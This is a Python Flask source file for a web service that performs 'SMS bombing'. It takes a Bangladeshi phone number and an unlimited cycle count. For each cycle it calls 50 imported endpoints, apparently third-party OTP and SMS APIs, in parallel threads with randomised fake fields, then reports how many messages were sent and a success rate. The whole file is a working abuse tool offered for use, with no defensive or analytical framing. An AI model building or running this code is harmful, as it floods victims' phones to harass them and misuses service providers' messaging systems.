import time
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify
from flask_cors import CORS

from api.utils import random_string
from api.batch1 import *
from api.batch2 import *
from api.batch3 import *
from api.batch4 import *
from api.batch5 import *

app = Flask(__name__)
CORS(app)

# List of all API functions
API_FUNCTIONS = [
    api_1, api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_10,
    api_11, api_12, api_13, api_14, api_15, api_16, api_17, api_18, api_19,
    api_20, api_21, api_22, api_23, api_24, api_25, api_26, api_27, api_28,
    api_29, api_30, api_31, api_32, api_33, api_34, api_35, api_36, api_37,
    api_38, api_39, api_40, api_41, api_42, api_43, api_44, api_45, api_46,
    api_47, api_48, api_49, api_50
]

def call_single_api(api_func, number, pgen=None, egen=None, did=None, did2=None, name=None):
    """Execute a single API call with proper parameters"""
    try:
        # Handle APIs with different parameter requirements
        if api_func in [api_9]:
            result = api_func(number, pgen, egen, did, name)
        elif api_func in [api_31]:
            result = api_func(number, egen, name)
        elif api_func in [api_33]:
            result = api_func(number, pgen, name)
        elif api_func in [api_37, api_39]:
            result = api_func(number, pgen, egen, name)
        else:
            result = api_func(number)
        
        if result and hasattr(result, 'status_code'):
            return {"success": result.status_code == 200, "status_code": result.status_code}
        return {"success": False, "status_code": "N/A"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_bombing(number, req_count):
    """Execute bombing requests with detailed statistics"""
    all_results = []
    working_apis = set()
    failed_apis_set = set()
    total_api_calls = 0
    successful_calls = 0
    
    for cycle in range(req_count):
        # Generate random strings for each cycle
        pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
        egen = random_string("?n?n?n?n?n?n?n?n")
        did = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
        name = random_string("?l?l?l?l?l?l")
        
        cycle_success = 0
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for api_func in API_FUNCTIONS:
                future = executor.submit(call_single_api, api_func, number, pgen, egen, did, None, name)
                futures.append((api_func.__name__, future))
            
            for api_name, future in futures:
                result = future.result()
                total_api_calls += 1
                if result.get("success"):
                    successful_calls += 1
                    cycle_success += 1
                    working_apis.add(api_name)
                else:
                    failed_apis_set.add(api_name)
        
        all_results.append({
            "cycle": cycle + 1,
            "successful": cycle_success,
            "failed": len(API_FUNCTIONS) - cycle_success
        })
        
        # Add delay between cycles (except after last cycle)
        if cycle < req_count - 1:
            time.sleep(2)
    
    # Calculate success rate
    success_rate = (successful_calls / total_api_calls * 100) if total_api_calls > 0 else 0
    
    return {
        "status": "Success",
        "sms_sended": successful_calls,
        "working_api": len(working_apis),
        "failed_api": len(failed_apis_set),
        "success_rate": round(success_rate, 2)
    }

@app.route('/', methods=['GET'])
def root():
    # Get parameters
    number = request.args.get('number')
    req_count = request.args.get('req')
    
    # If no parameters provided, show usage guide
    if number is None and req_count is None:
        return jsonify({
            "error": "Invalid Request",
            "message": "Please use: ?number=017xxxxxxxx&req=1",
            "example": "/?number=01712345678&req=5",
            "parameters": {
                "number": "Bangladesh phone number (11 digits, without +88)",
                "req": "Number of cycles (1 to unlimited)"
            }
        }), 400
    
    # Validate number
    if not number:
        return jsonify({
            "error": "Missing Parameter",
            "message": "Please provide 'number' parameter",
            "example": "/?number=01712345678&req=1"
        }), 400
    
    # Validate number format
    number = str(number).strip()
    if not number.isdigit():
        return jsonify({
            "error": "Invalid Number",
            "message": "Number must contain only digits",
            "example": "01712345678"
        }), 400
    
    if len(number) != 11:
        return jsonify({
            "error": "Invalid Number Length",
            "message": "Number must be exactly 11 digits",
            "example": "01712345678"
        }), 400
    
    # Validate request count
    if not req_count:
        req_count = 1
    else:
        try:
            req_count = int(req_count)
            if req_count < 1:
                req_count = 1
        except ValueError:
            return jsonify({
                "error": "Invalid Request Count",
                "message": "'req' must be a valid number",
                "example": "req=5"
            }), 400
    
    try:
        # Execute bombing
        result = execute_bombing(number, req_count)
        return jsonify(result), 200
        
    except Exception as e:
        return jsonify({
            "status": "Error",
            "error": "Execution Failed",
            "message": str(e)
        }), 500

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return jsonify({
        "error": "Invalid Path",
        "message": "Use root path with parameters: ?number=017xxxxxxxx&req=1"
    }), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({
        "status": "Error",
        "error": "Internal Server Error",
        "message": "Please try again later"
    }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
